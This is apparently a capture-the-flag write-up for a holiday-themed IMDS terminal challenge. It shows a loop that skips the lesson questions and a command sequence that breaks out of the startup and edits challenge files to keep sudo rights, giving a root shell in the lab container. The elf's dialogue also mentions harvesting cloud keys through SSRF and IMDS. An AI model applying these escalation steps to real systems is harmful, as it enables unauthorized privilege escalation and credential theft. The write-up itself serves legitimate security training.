## Request

    Hey, this is the executive restroom. Wasn't that door closed?<br/>
    I'm Noxious O'Dor. And I've gotta say, I think that Jack Frost is just messed up.<br/>
    I mean, I'm no expert, but his effort to "win" against Santa by going bigger and bolder seems bad.<br/>
    You know, I'm having some trouble with this IMDS exploration. I'm hoping you can give me some help in solving it.<br/>
    If you do, I'll be happy to trade you for some hints on SSRF! I've been studying up on that and have some good ideas on how to attack it!<br/>


## Solution

??? abstract "Welcome message"
    ```text
    ðŸŽ„ðŸŽ„ðŸŽ„ Prof. Petabyte here. In this lesson you'll continue to build your cloud asset skills,
    ðŸŽ„ðŸŽ„ðŸŽ„ interacting with the Instance Metadata Service (IMDS) using curl.
    ðŸŽ„ðŸŽ„ðŸŽ„
    ðŸŽ„ðŸŽ„ðŸŽ„ If you get stuck, run 'hint' for assitance.
    ðŸŽ„ðŸŽ„ðŸŽ„
    ```

This terminal takes you through what [IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) is and how you can interact with the service by going over various sample `curl` commands. Instead of rehashing the same commands here and calling it a write-up, let's look at some other fun things we can do, like skipping past all the questions to get the achievement or elevating our privileges to *root*! :metal:

During Prof. Petabyte's lesson you're asked to type *next* a few times. This command actually works for every single question and so a one-liner like `for i in {1..18}; do next; sleep 1; done` will award you the achievement with minimal effort.

!!! note "Getting root<span id="getting-root"></span>"
    Skipping past all the questions is fun, but getting a root shell is better! :partying_face:

    Start by using ++"Ctrl"++ + ++"c"++ to break out of the startup sequence. If you time it right you'll prevent the bottom pane from fully loading and end up logged in as the *init* user. In the user's home folder you'll find a [`tmuxp`](https://github.com/tmux-python/tmuxp) session configuration file (i.e., `mysession.yaml`), the `top_pane` and `bottom_pane` [setuid](https://en.wikipedia.org/wiki/Setuid) binaries that are run in each `tmux` pane, and a `questions_answers.json` file.

    During terminal startup there's an `/etc/sudoers` file present with an entry for the *elfu* user. However, as `top_pane` parses `questions_answers.json` and loads the data for the first question, it'll execute 2 additional commands, one being `sudo rm /etc/sudoers` which removes *elfu*'s `sudo` permissions again. 

    To get a root shell, open a new `tmux` window using ++"Ctrl"++ + ++"b"++ ++"c"++ (line 2), kill the old processes (lines 3-5), take ownership of the files so we can edit them (lines 6-9), change the session name in `mysession.yaml` (line 10), edit `questions_answers.json` so it doesn't delete `/etc/sudoers` (line 11), and load `mysession.yaml` to initialize everything again (line 12). We've now switched to the *elfu* account but with the `/etc/sudoers` file still in place, meaning `sudo bash` will give us our root shell.

    ```shell linenums="1" title="Terminal commands"
    # ctrl+c out of the startup sequence
    # ctrl+b c to open a new tmux window
    ps ax  # list all processes
    kill -9 43  # kill the old top pane bash process
    kill -9 79  # kill the old bottom pane bash process
    cp questions_answers.json questions_answers_copy.json  # create a writable copy
    mv -f questions_answers_copy.json questions_answers.json  # rename the file to replace the original
    cp mysession.yaml mysession_copy.yaml  # create a writable copy
    mv -f mysession_copy.yaml mysession.yaml  # rename the file to replace the original
    sed -i 's/ElfU/Elfu2Root/g' mysession.yaml  # edit the session name to Elfu2Root
    pico questions_answers.json  # remove the "sudo rm /etc/sudoers" line (e.g., pico, vi)
    tmuxp load mysession.yaml  # load the tmux session again
    sudo bash  # leverage elfu's sudo permissions
    ```

    Putting all of the above into practice looks something like this.

## Response

!!! quote "Noxious O'Dor"
    Phew! That is something extra! Oh, and you solved the challenge too? Great!<br/>
    Cloud assets are interesting targets for attackers. Did you know they automatically get IMDS access?<br/>
    I'm very concerned about the combination of SSRF and IMDS access.<br/>
    Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks?<br/>
    Dr. Petabyte told us, "anytime you see URL as an input, test for SSRF."<br/>
    With an SSRF attack, we can make the server request a URL. This can reveal valuable data!<br/>
    The [AWS documentation for IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) is interesting reading.
